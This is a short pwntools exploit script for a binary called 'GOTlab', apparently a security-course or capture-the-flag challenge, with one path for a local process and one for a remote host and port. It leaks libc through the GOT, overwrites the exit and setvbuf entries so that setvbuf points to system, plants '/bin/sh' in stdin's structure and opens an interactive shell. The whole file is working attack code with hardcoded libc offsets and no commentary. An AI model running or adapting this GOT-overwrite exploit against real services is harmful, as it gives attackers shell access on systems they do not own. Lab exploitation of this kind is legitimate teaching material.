from pwn import *

localhost = True

if localhost:
    #libc-2.27.so
    printf_plt = 0x601020
    libc_printf = 0x64f70
    exit_plt = 0x601038 
    main = 0x40079f 
    setvbuf_plt = 0x601028
    libc_system = 0x4f550 
    libc_IO_stdin = 0x3eba00
    server = process('./sourcecode/GOTlab')
else:
    #libc-2.29.so
    printf_plt = 0x404020
    libc_printf = 0x62830
    exit_plt = 0x404038
    main = 0x4011ee 
    setvbuf_plt = 0x404028
    libc_system = 0x52fd0
    libc_IO_stdin = 0x1e4a00
    server = remote('140.112.31.97',30103)

server.sendlineafter('address : ',str(printf_plt))
libc_base = int(server.recvline(),16) - libc_printf
server.sendlineafter('address : ',str(exit_plt))
server.sendlineafter('value : ',str(main))

server.sendlineafter('address : ',str(printf_plt))
server.sendlineafter('address : ',str(setvbuf_plt))
server.sendlineafter('value : ',str(libc_base + libc_system))

server.sendlineafter('address : ',str(printf_plt))
server.sendlineafter('address : ',str(libc_base + libc_IO_stdin))
server.sendlineafter('value : ',str(u64(b'/bin/sh\x00')))

server.interactive()